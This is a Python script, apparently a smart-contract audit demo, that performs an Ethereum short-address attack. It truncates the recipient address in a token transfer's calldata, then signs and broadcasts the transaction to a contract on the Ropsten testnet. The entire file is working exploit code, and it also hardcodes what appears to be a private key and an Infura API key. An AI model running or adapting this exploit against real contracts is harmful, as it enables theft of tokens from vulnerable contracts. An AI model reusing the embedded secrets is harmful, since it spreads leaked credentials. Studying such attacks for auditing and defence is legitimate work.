#!/usr/bin/env python3

from web3 import *
import json
from solc import compile_source

# target short address
target_addr = "0x74b09f793162A1053e6fb5447CDA3B4386340000"


class ShortAddrAttack:
    w3 = None
    privateKey = None
    contract_addr = None
    sol_path = None
    contract_name = None
    contract_interface = None
    account = None
    target_addr = None

    def __init__(self, http_provider_api, priv_key, contract_addr, sol_path, contract_name):
        # get HTTPProvider
        self.w3 = Web3(HTTPProvider(http_provider_api))
        self.w3.eth.enable_unaudited_features()
        # set basic info
        self.privateKey = priv_key
        self.contract_addr = contract_addr
        self.sol_path = sol_path
        self.contract_name = contract_name
        # compile code to get the interface
        self.compile_code()
        # get account from private key
        self.account = self.w3.eth.account.privateKeyToAccount(self.privateKey)

    def compile_code(self):
        '''
        get contract interface from source code
        '''
        contract_file = open(self.sol_path)
        contract_soucecode = contract_file.read()
        compiled_sol = compile_source(contract_soucecode)
        target_contract = compiled_sol[self.contract_name]
        self.contract_interface = self.w3.eth.contract(
            abi=target_contract['abi'],
            bytecode=target_contract['bin'])

    @staticmethod
    def make_short_address(raw_data, addr):
        '''
        replace normal address to short address in raw data
        '''
        addr = addr.lower()
        if addr[0:2] == "0x":
            addr = addr[2:]
        tmp_addr = addr
        if len(tmp_addr) != 40:
            print("Format of target address is Wrong.")
            return raw_data
        zero_num = 0
        while True:
            if tmp_addr[-1:] == "0":
                zero_num += 1
                tmp_addr = tmp_addr[:-1]
            else:
                break
        print("The original raw data is {0}".format(raw_data))
        raw_data = raw_data.replace(addr, tmp_addr)
        print("The modfied  raw data is {0}".format(raw_data))
        return raw_data

    def call_sendCoin(self, _to, _amount):
        print("Call sendCoin() to send {0} Coins to {1}...".format(_amount, _to))
        try:
            # update nonce for account
            nonce = self.w3.eth.getTransactionCount(self.account.address)
            # build raw trasaction
            raw_txn = self.contract_interface.functions.sendCoin(_to, _amount).buildTransaction({
                'from': self.account.address,
                'to': self.contract_addr,
                'nonce': nonce,
                'gas': 3000000,
                'gasPrice': Web3.toWei(5, 'gwei')})

            # modity data in raw_txn to add short address attack
            raw_txn['data'] = self.make_short_address(
                raw_txn['data'], target_addr)
            # sign raw txn
            signed_txn = self.account.signTransaction(raw_txn)
            # send txn to network
            txid = self.w3.eth.sendRawTransaction(signed_txn.rawTransaction)
            print("Success to send trsactions! txid: {0}".format(txid.hex()))
            print("Click here to see the trasaction:  https://ropsten.etherscan.io/tx/{0}".format(txid.hex()))
        except Exception as e:
            print(e)


if __name__ == "__main__":
    http_provider_api = "https://ropsten.infura.io/v3/a209e17cf92440ccab50d2a98efe83f8"
    priv_key = "7cd2e3bcaaf9c465f5a1c85b59ac0fe9b2dc0169afa52d127df2b7e39365ba5f"
    contract_addr = "0xde62fe573c54bc7071034a004234b1485ddd31ad"
    sol_path = "/home/reece/workspace/smartcontract/smartcontract_audit/10/1001_shortaddr.sol"
    contract_name = "<stdin>:ShortToken"
    slogan = "Short Addresses Attack Demo"
    print("#"*len(slogan))
    print(slogan)
    print("#"*len(slogan))
    sAttack = ShortAddrAttack(http_provider_api, priv_key,
                              contract_addr, sol_path, contract_name)
    sAttack.call_sendCoin(target_addr, 10)
